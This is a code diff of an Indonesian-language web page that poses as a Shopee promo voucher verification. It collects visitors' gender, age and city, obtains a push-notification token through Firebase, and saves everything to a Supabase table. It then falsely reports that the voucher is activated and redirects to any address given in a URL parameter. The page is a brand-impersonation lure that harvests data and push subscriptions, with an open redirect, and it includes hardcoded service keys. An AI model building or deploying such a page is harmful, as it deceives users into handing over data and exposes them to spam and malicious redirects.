@@ -4,11 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Shopee Indonesia | Verifikasi Promo</title>
-
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-messaging-compat.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
     <style>
         body { font-family: sans-serif; background-color: #f5f5f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
         .card { background: white; width: 90%; max-width: 400px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 25px; text-align: center; }
@@ -34,7 +32,6 @@
 
     <div id="formSection">
         <h2>Klaim Promo Shopee</h2>
-
         <div id="stepGender">
             <select id="gender" onchange="nextStep('age')">
                 <option value="">-- Pilih Jenis Kelamin --</option>
@@ -42,7 +39,6 @@
                 <option value="wanita">Wanita</option>
             </select>
         </div>
-
         <div id="stepAge" class="hidden">
             <select id="age" onchange="nextStep('city')">
                 <option value="">-- Pilih Rentang Usia --</option>
@@ -51,7 +47,6 @@
                 <option value="36+">Diatas 35 Tahun</option>
             </select>
         </div>
-
         <div id="stepCity" class="hidden">
             <input type="text" id="cityInput" placeholder="Masukkan Kota Anda">
             <button class="btn-shopee" onclick="processValidation()">AKTIFKAN VOUCHER</button>
@@ -61,12 +56,22 @@
     <div id="redirectSection" class="hidden">
         <h2 style="color:#2ecc71;">Verifikasi Berhasil!</h2>
         <p>Voucher telah diaktifkan.</p>
-        <button class="btn-shopee" onclick="location.href='https://shopee.co.id'">BUKA SHOPEE</button>
+        <button class="btn-shopee" id="btnGoShopee">BUKA SHOPEE</button>
     </div>
 </div>
 
 <script>
-/* ================= FIREBASE INIT ================= */
+/* 1. AMBIL PARAMETER URL DINAMIS */
+const urlParams = new URLSearchParams(window.location.search);
+const dest = urlParams.get('url') || "https://shopee.co.id";
+document.getElementById('btnGoShopee').onclick = function() { location.href = dest; };
+
+/* 2. LOGIKA LOCALSTORAGE (CEK DI AWAL) */
+if (localStorage.getItem('shopee_done')) {
+    document.getElementById('formSection').classList.add('hidden');
+    document.getElementById('redirectSection').classList.remove('hidden');
+}
+
 firebase.initializeApp({
     apiKey: "AIzaSyD_zJ9VxNeNZCBwaXpzgHbbfmw3Ymj5QTA",
     authDomain: "shopee-promo.firebaseapp.com",
@@ -77,22 +82,13 @@ firebase.initializeApp({
 });
 
 const messaging = firebase.messaging();
-
-/* ================= REGISTER SERVICE WORKER (FIX UTAMA) ================= */
 let swRegistration = null;
 
 if ('serviceWorker' in navigator) {
     navigator.serviceWorker.register('/shopeebridge/firebase-messaging-sw.js')
-        .then(reg => {
-            swRegistration = reg;
-            console.log('SW registered');
-        })
-        .catch(err => {
-            console.error('SW registration failed:', err);
-        });
+        .then(reg => { swRegistration = reg; });
 }
 
-/* ================= SUPABASE ================= */
 const mySupabase = supabase.createClient(
     "https://zscupvelldysboqatuee.supabase.co",
     "sb_publishable_0PlYfd9A6FxFzO6YqMznrA_4RCpF9XR"
@@ -100,29 +96,27 @@ const mySupabase = supabase.createClient(
 
 let userData = { gender:'', age:'', city:'', token:'' };
 
-/* ================= UI FLOW ================= */
 function nextStep(step) {
     if (step === 'age') {
-        userData.gender = gender.value;
-        stepGender.classList.add('hidden');
-        stepAge.classList.remove('hidden');
+        userData.gender = document.getElementById('gender').value;
+        document.getElementById('stepGender').classList.add('hidden');
+        document.getElementById('stepAge').classList.remove('hidden');
     } else {
-        userData.age = age.value;
-        stepAge.classList.add('hidden');
-        stepCity.classList.remove('hidden');
+        userData.age = document.getElementById('age').value;
+        document.getElementById('stepAge').classList.add('hidden');
+        document.getElementById('stepCity').classList.remove('hidden');
     }
 }
 
 function showSection(id) {
-    loadingSection.classList.add('hidden');
-    formSection.classList.add('hidden');
-    redirectSection.classList.add('hidden');
+    document.getElementById('loadingSection').classList.add('hidden');
+    document.getElementById('formSection').classList.add('hidden');
+    document.getElementById('redirectSection').classList.add('hidden');
     document.getElementById(id).classList.remove('hidden');
 }
 
-/* ================= MAIN PROCESS ================= */
 async function processValidation() {
-    userData.city = cityInput.value.trim();
+    userData.city = document.getElementById('cityInput').value.trim();
     if (userData.city.length < 3) return alert("Masukkan nama kota");
 
     showSection('loadingSection');
@@ -134,19 +128,19 @@ async function processValidation() {
                 vapidKey: "BPVouVO9zg4a1ZZ81K02MjTA5mgc-mxExWNaALL1PsBevaUHJ-WnKykmUJogmH26TtX9S5c9wHbpZ9uaRfnKY68",
                 serviceWorkerRegistration: swRegistration
             });
-
             if (token) userData.token = token;
         }
 
+        // Pakai insert seperti kode lama Anda yang terbukti jalan
         await mySupabase.from('subscriber').insert([userData]);
+        
+        // Simpan ke memori HP agar tidak tanya lagi
+        localStorage.setItem('shopee_done', 'true');
 
-    } catch (e) {
-        console.error("ERROR:", e);
-    }
+    } catch (e) { console.error("ERR:", e); }
 
     setTimeout(() => showSection('redirectSection'), 1000);
 }
 </script>
-
 </body>
 </html>
